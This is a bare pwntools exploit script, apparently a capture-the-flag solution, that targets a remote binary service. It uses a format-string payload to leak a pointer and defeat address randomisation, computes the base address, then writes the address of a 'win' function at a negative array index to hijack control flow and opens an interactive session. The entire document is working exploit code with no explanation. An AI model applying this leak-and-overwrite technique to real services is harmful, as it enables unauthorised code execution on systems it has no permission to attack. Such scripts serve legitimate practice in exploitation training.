from pwn import *

elf = ELF('./client')
p = remote('sisterlab.id', 42006)

p.sendlineafter(b': ', b"1")
p.sendlineafter(b': ', b"0")
p.sendlineafter(b': ', b"100")
p.sendlineafter(b': ', b"%d%d%d%d%d%d%d%d%d%d%p")
p.sendlineafter(b': ', b"2")
p.sendlineafter(b': ', b"0")
p.recvuntil(b"0x")

mjl = int(p.recvline().decode(), 16)
mje = 0x16a1
elf.address = mjl -  mje
win = elf.symbols['win']

p.sendlineafter(b': ', b"1")
p.sendlineafter(b': ', b"-6")
p.sendlineafter(b': ', str(win))
p.sendlineafter(b': ', b"1")
p.sendlineafter(b': ', b"0")

p.interactive()